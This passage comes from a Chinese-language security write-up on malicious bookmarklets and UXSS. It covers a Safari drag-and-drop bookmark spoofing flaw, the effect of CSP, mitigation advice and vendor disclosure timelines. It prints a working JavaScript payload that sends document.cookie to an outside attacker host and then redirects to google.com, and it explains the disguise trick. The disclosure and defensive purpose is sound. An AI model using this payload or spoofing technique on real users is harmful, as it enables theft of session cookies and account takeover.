  4. 在已经打开任何域的情况下，打开书签，书签中的恶意 javascript 代码就会注入到当前域下。一个 UXSS 攻击就发生了。
##### 4.2 拖放恶意小书签
除了导入书签文件外，还可以使用拖放的方式来保存书签。
我们Safari浏览器中找到一个真实的小书签攻击案例。整个场景将在 MAC+IPad 环境下进行，为了体现攻击效果，我们在攻击场景中加入了设备之间的
SYNC，在这个攻击过程中，利用了一个 Safari 浏览器的拖放书签欺骗漏洞，来欺骗用户把恶意的小书签保存到收藏夹中，这个小书签保存后名称会显示
google.com，点击后也会到达 google.com，整个攻击过程非常隐蔽，很容易欺骗到用户。假设用户已经在 MAC、IPad 中打开了 Amazon
和 Gmail。那么当用户点击 google.com这个书签导航到 google.com 后，Amazon 和 Gmail 的 cookie
就被攻击者获取到了。
这个攻击场景如下图： 
  1. 用户拖放链接保存为书签。
  2. 设备开启同步后，书签也会保存到其他设备上。
  3. 当用户点击书签后，当前域的 cookie 会发送给攻击者。
第一步很关键，用户拖放链接保存为书签。这里会用到一个 Safari 浏览器拖放书签的欺骗攻击。先简单说下这个欺骗漏洞的原理，把如下代码保存为
attack.html。
    google.com
用 Safari 打开后，链接会显示 google.com，用户点击后会指向 google.com。但用户拖放这个链接保存为书签时，拖放的内容会被替换为
http://baidu.com/#/google ，而保存到收藏夹后，由于 Safari 收藏夹的设计特点，会取 URL
中最后“/”后面的字符作为书签的名字，所以书签的名字将是 google。那么在整个保存为书签的过程中，用户看到的始终是
google，所以不会对此次拖放保存书签有怀疑。当用户点击书签链接时，由于链接中加入了 #，所以 URL 会忽略掉#后面的内容，直接转向到了
baidu.com。这可以看做是一次重定向攻击。
了解完书签拖放欺骗的原理后，我们就来看一个真正的攻击，这次拖放替换的内容不是一个 URL，而是一个 javascript:
开头的小书签。可以直接在当前域下注入任意 javascript 代码。一个 UXSS 产生了。
将如下代码保存为 attack.html 代码：
    google.com
编码部分的代码为：
    var b=document.createElement('script');b.src='http://xisigr.com/2015test/get.php?cookie='+escape(document.cookie);document.body.appendChild(b);setTimeout("location='http://www.google.com'",1000);
演示视频： 
### 5 CSP的出现使小书签消亡
自从内容安全策略（Content Security Policy，简称
CSP）开始被提出，这些年逐渐被各大浏览器厂商支持和认可，也预示着小书签的历史使命走到了尽头。
大家知道 CSP 是为了防止 XSS
而设计，默认配置下不允许执行内联代码（``块内容，内联事件，内联样式），以及禁止执行`eval()`,`newFunction()`,`setTimeout([string],
…)`和`setInterval([string], …)`。
内联 Javascript 不能运行，不能加载外部资源，这些限制都使得小书签将不能正常工作。就此问题，Firefox 的 bugzilla
社区中曾有过白热化的讨论，，其中有一个对狂热的书签使用者说道：
> 作为一个“超级用户”，我非常依赖我的书签工具和 Greasemonkey 的用户脚本来执行各种功能和特性，在各种网站（加入了 CSP
> 防御），书签中的脚本无法使用，现在这个的问题，非常恼人，困然了我好几个月。安全性显然是重要的，但是，作为最终用户，我应该永远有控制和浏览体验的绝对权力，并且几乎能够做我想做的。
而另一篇文章，则直接写到Bookmarklets are Dead… 
在我们写这篇文章时，Firefox/Edge 浏览器中，小书签作为内联JS是不可以运行的，Chrome/Safari
浏览器中则是可以的。这是不是也可以认为小书签绕过了 CSP 呢？
### 6 建议
其实对于`Javascript:URLs`这样的用法，浏览器厂商也已经开始意识到它在特殊场景下所带来的安全风险。比如在之前的浏览器中，用户可以直接粘贴`Javascript:URLs`到地址栏并运行，但现在
Chrome /Firefox/Edge 浏览器会直接把`Javascript:`这个协议关键字去掉。
但对于小书签中可以直接执行 `Javascript:URLs`，浏览器厂商始终保持一个较为保守的态度，毕竟小书签已经伴随浏览器 20
多年。对此，我们对小书签的使用，提出几点安全建议，可以暂时缓解小书签带来的安全风险：
浏览器厂商方面：对小书签的内容和权限进行颗粒度更细的控制。比如从文件或其他浏览器导入小书签时，严格过滤小书签内容，对可疑小书签弹出风险提示。
安全厂商方面：可以推出检测小书签的浏览器插件等。对恶意小书签，弹出预警提示。
用户方面：不要随意导入第三方小书签，明确导入的小书签功能是什么。
### 7 厂商回复
**Chrome**  
2015/04/13：向 Chrome 报告浏览器小书签安全问题 2015/04/13：Chrome
答复小书签上面的安全问题，他们在内部也讨论了很多次，目前来看小书签的实用性大于它带来的安全风险。 截至发稿时，并没有修复小书签可能涉及的安全风险。
**Firefox**  
2015/04/13：向 Firefox 报告浏览器小书签安全问题 2015/04/14：Firefox
回复他们认为导入书签时，应该有个风险提示。还认为恶意书签的钓鱼、重定向攻击也是很严重。 截至发稿时，并没有修复小书签可能涉及的安全风险。
**Safari**  
2015/04/13：向 Apple 报告 Safari 浏览器小书签安全问题 2015/04/21：向 Apple 报告 Safari 浏览器书签拖放欺骗
2015/12/02：向 Apple 提供详细漏洞视频 2015/12/25：询问 Apple 处理漏洞进度 2016/01/27：Apple
回复正在调查中 截至发稿时，没有任何回复，并没有修复小书签可能涉及的安全风险。
### 8 参考
[1] http://zh.wikipedia.org/zh-cn/小书签
[2] https://bugzilla.mozilla.org/show_bug.cgi?id=866522
[3] https://medium.com/making-instapaper/bookmarklets-are-dead-d470d4bbb626
* * *